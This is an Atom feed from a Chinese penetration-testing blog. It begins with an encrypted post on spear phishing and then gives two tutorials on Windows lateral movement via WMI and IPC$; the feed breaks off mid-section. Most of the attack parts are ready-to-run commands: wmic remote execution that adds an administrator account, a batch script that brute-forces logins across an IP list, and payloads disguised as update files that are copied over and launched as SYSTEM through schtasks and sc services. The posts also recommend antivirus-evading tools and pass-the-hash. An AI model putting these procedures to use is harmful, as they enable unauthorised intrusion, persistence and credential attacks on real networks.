e66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于WMI的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:12:24.000Z</published>
    <updated>2020-11-14T19:55:04.354Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于WMI的横向移动</p></blockquote><a id="more"></a><h2 id="WMI-介绍"><a href="#WMI-介绍" class="headerlink" title="WMI 介绍"></a>WMI 介绍</h2><p><code>WMI </code>的全称是 <code>Windows Management Instrumentation</code>，它出现在所有的 <code>Windows</code>操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的<code>Windows</code>系统，攻击者使用<code>wmi</code>来进行攻击，但 <code>Windows </code>系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用<code>wmic</code>进行远程执行命令。 </p><h2 id="WMI-利用条件"><a href="#WMI-利用条件" class="headerlink" title="WMI 利用条件"></a>WMI 利用条件</h2><p> 远程服务器启动<code>Windows Management Instrumentation</code>服务（默认开启）</p><p> <code>135</code> 端口未被过滤 [<strong>默认配置下目标主机防火墙开启将无法连接</strong>]</p><h2 id="连接失败常见错误号："><a href="#连接失败常见错误号：" class="headerlink" title="连接失败常见错误号："></a>连接失败常见错误号：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.开启防火墙时，允许共享例外</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">2</span>.组策略阻止administraotr远程访问时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070005</span><br><span class="line">说明 = 拒绝访问。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">3</span>.IP安全策略阻止<span class="number">135</span>时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">4</span>.禁用winmgmt服务时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070422</span><br><span class="line">说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">5</span>.拒绝wbem目录权限，无法使用wmic的</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="利用-wmic-进行横向移动"><a href="#利用-wmic-进行横向移动" class="headerlink" title="利用 wmic 进行横向移动"></a>利用 wmic 进行横向移动</h2><h3 id="常用系统自带命令"><a href="#常用系统自带命令" class="headerlink" title="常用系统自带命令"></a>常用系统自带命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出远程主机进程</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process list brief</span></span><br><span class="line"><span class="number">2</span>.在远程系统上执行bat脚本</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"><span class="number">3</span>.在远程系统上执行单条命令</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line">引用自：https://www.cnblogs.com/<span class="number">0</span>xdd/p/<span class="number">11393392</span>.html</span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。</p><p>※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改</p><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief  &gt;&gt; log.txt</span><br><span class="line">wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> errorlevel == <span class="number">0</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i &gt;&gt; pic.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>没有使用过，暂未测试</p><p><code>wmiexec.vbs</code> 是为了解决<code>wmic</code>无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.1.1 administrator test@123 whoami</span><br></pre></td></tr></table></figure><h4 id="impacket-wmiexec"><a href="#impacket-wmiexec" class="headerlink" title="impacket-wmiexec"></a>impacket-wmiexec</h4><p>优点：支持pth</p><p>缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口，而smbexec只使用445端口。</p><p>使用参考：2.（1）<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</a> </p><h4 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h4><p>这是一个基于<code>135</code>端口来进行横向移动的工具，具有执行命令和上传文件功能，通过<code>wmi</code>来执行命令，通过调用来进行数据传输。<br>优点：只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口<br>缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖<strong>powershell(被360拦截了)</strong></p><p><a href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p><h4 id="WMIHACKER-推荐"><a href="#WMIHACKER-推荐" class="headerlink" title="WMIHACKER(推荐)"></a>WMIHACKER(推荐)</h4><p>免杀横向渗透远程命令执行，常见的<code>WMIEXEC</code>、<code>PSEXEC</code>执行命令是创建服务或调用<code>Win32_Process.create</code>执行命令，这些方式都已经被杀软100%拦截，通过改造出<code>WMIHACKER</code>免杀横向移动测试工具。(只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口)</p><p>重要：支持pth -&gt;  <a href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a> </p><p>主要功能：1、命令执行；2、文件上传；3、文件下载</p><p><a href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a></p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">WMI爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a></td></tr><tr><td align="left">WMI-NtlmHash爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a></td></tr></tbody></table><h4 id="Sharp-WMIExec"><a href="#Sharp-WMIExec" class="headerlink" title="Sharp-WMIExec"></a>Sharp-WMIExec</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a> </p><h4 id="WMIcmd"><a href="#WMIcmd" class="headerlink" title="WMIcmd"></a>WMIcmd</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于WMI的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于IPC的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:11:24.000Z</published>
    <updated>2020-11-14T19:53:20.982Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于IPC的横向移动</p></blockquote><a id="more"></a><p>文章内容引用较多，尽量不说废话，注明链接的地方，请自行阅读并理解。</p><h2 id="IPC-的概念"><a href="#IPC-的概念" class="headerlink" title="IPC$的概念"></a>IPC$的概念</h2><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p><h2 id="IPC-的作用"><a href="#IPC-的作用" class="headerlink" title="IPC$的作用"></a>IPC$的作用</h2><p>利用<code>IPC$</code>，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 </p><h2 id="IPC-的利用条件"><a href="#IPC-的利用条件" class="headerlink" title="IPC$的利用条件"></a>IPC$的利用条件</h2><h3 id="139，445端口开启"><a href="#139，445端口开启" class="headerlink" title="139，445端口开启"></a>139，445端口开启</h3><p><code>IPC$</code>连接可以实现远程登陆及对默认共享的访问，而<code>139</code>端口的开启表示<code>netbios</code>协议的应用。我们可以通过<code>139</code>和<code>445</code>端口来实现对共享文件/打印机的访问，因此一般来讲，<code>IPC$</code>连接是需要<code>139</code>或<code>445</code>端口来支持的。</p><p>注：<code> Windows</code>系统中的<code>net use ipc$</code>整个通信过程，先<code>445-&gt;137-&gt;139</code>验证，当你开启防火墙禁用<code>445</code>，发现系统命令就无法连接<code>IPC</code>了，因为根本没机会走到<code>139</code>，所以使用系统自带命令连接的<code>ipc$</code>需要同时开启这些端口 ，参考自<code>K8gege.org</code>。</p><h3 id="管理员开启了默认共享"><a href="#管理员开启了默认共享" class="headerlink" title="管理员开启了默认共享"></a>管理员开启了默认共享</h3><p>默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘<code>（C$,D$,E$...）</code>和系统目录<code>WINNT</code>或<code>WINDOWS(ADMIN$)</code>，我们通过<code>IPC</code>连接可以实现对这些默认共享的访问。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C<span class="variable">$</span>           C:\                             默认共享</span><br><span class="line">IPC<span class="variable">$</span>                                         远程 IPC</span><br><span class="line">ADMIN<span class="variable">$</span>       C:\WINDOWS                      远程管理</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="建立远程连接时的用户权限问题"><a href="#建立远程连接时的用户权限问题" class="headerlink" title="建立远程连接时的用户权限问题"></a>建立远程连接时的用户权限问题</h3><p>这个不多说，很多文章没有介绍，是一个坑点：<a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">传送门-关于IPC和PTH用户权限问题</a></p><p>※即默认情况下只有域管用户有权限对<code>admin$</code>目录建立<code>IPC</code>连接，其实本地的<code>Administrator</code>用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用<code>Administrator</code>用户远程连接 </p><h4 id="IPC-连接失败常见错误号："><a href="#IPC-连接失败常见错误号：" class="headerlink" title="IPC$连接失败常见错误号："></a>IPC$连接失败常见错误号：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">错误号 <span class="number">5</span>，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】</span><br><span class="line">错误号 <span class="number">51</span>，Windows 无法找到网络路径【网络有问题】</span><br><span class="line">错误号 <span class="number">53</span>，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动； 目标有防火墙（端口过滤）】</span><br><span class="line">错误号 <span class="number">67</span>，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc<span class="variable">$</span>；】 </span><br><span class="line">错误号 <span class="number">1219</span>，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc<span class="variable">$</span>，请删除后再连】</span><br><span class="line">错误号 <span class="number">1326</span>，未知的用户名或错误密码【原因很明显了】</span><br><span class="line">错误号 <span class="number">1385</span>，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">---</span><br><span class="line">情况<span class="number">1</span>：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：</span><br><span class="line">开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户</span><br><span class="line">情况<span class="number">2</span>：</span><br><span class="line">(<span class="number">1</span>)网络访问为：经典</span><br><span class="line">(<span class="number">2</span>)来宾账户状态：已启用，</span><br><span class="line">(<span class="number">3</span>)拒绝从网络访问这台计算机里有Guest用户或组</span><br><span class="line">(<span class="number">4</span>)你执行net use \\xxx.xxx.xxx.xxx\IPC<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;xxx&quot;</span> 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误</span><br><span class="line">---</span><br><span class="line">错误号 <span class="number">1792</span>，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 <span class="number">2242</span>，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】 </span><br></pre></td></tr></table></figure><h2 id="基于IPC-的横向移动"><a href="#基于IPC-的横向移动" class="headerlink" title="基于IPC$的横向移动"></a>基于IPC$的横向移动</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>.建立空连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;&quot;</span> /u:<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">1</span>.建立正常连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span> </span><br><span class="line"><span class="number">2</span>.查看本机连接共享情况</span><br><span class="line">net use</span><br><span class="line"><span class="number">3</span>.查看已建立连接目标主机的共享资源</span><br><span class="line">net view \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">4</span>.查看目标主机时间</span><br><span class="line">net time \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">5</span>.查看目标主机的NetBIOS用户（自己本机也需开启）</span><br><span class="line">nbtstat <span class="literal">-A</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">6</span>.删除本机与指定ip建立的连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">7</span>.删除本机所有已建立的连接</span><br><span class="line">net use * /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">8</span>.文件的上传下载与删除</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\windows\temp\plugin_update.exe</span><br><span class="line">[推荐用<span class="type">xcopy</span>]:</span><br><span class="line">xcopy d:\sqlitedata\*.* \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\temp /E /Y /D</span><br><span class="line">（上传本地文件到目标的:c\windows\temp\目录下）</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe c:\</span><br><span class="line">（下载目标文件到本地c盘下）</span><br><span class="line"><span class="built_in">del</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe /F</span><br><span class="line">（删除目标文件）</span><br><span class="line"><span class="number">9</span>.创建计划任务之schtasks</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr c:\windows\temp\plugin_update.exe /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">补充<span class="number">1</span>：schtasks /create /tn <span class="string">&quot;Flash_Update&quot;</span> /tr C:\Users\Public\Flash_Update.exe /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">立即执行计划任务</span><br><span class="line">schtasks /run /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">删除计划任务</span><br><span class="line">schtasks /F /delete /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">计划任务远程开启默认共享&#123;注意查看目标主机时间&#125;</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr <span class="string">&quot;cmd /c net share c<span class="variable">$</span>=c:&quot;</span> /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">25</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line"><span class="number">10</span>.创建计划任务之at</span><br><span class="line">（at只支持win03和部分老版本win08，一般情况下，win08<span class="literal">-SP1</span>的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）</span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">14</span>:<span class="number">05</span> cmd /c <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> </span><br><span class="line"><span class="number">11</span>.SC创建服务</span><br><span class="line">（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报<span class="number">1053</span>错误）</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create shellsrv binpath= <span class="string">&quot;c:\shell.exe&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create test binpath= <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="built_in">start</span> shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> stop shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> delete shellsrv</span><br><span class="line"><span class="number">12</span>.删除默认共享</span><br><span class="line">net share c<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line"><span class="number">13</span>.恢复默认共享</span><br><span class="line">net share c<span class="variable">$</span>=c:</span><br><span class="line"><span class="number">15</span>.对方的c盘映射为自己的z盘，其他盘类推(不推荐)</span><br><span class="line">net use z: \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="number">16</span>.删除映射的c盘，其他盘类推</span><br><span class="line">net use c: /<span class="built_in">del</span></span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" 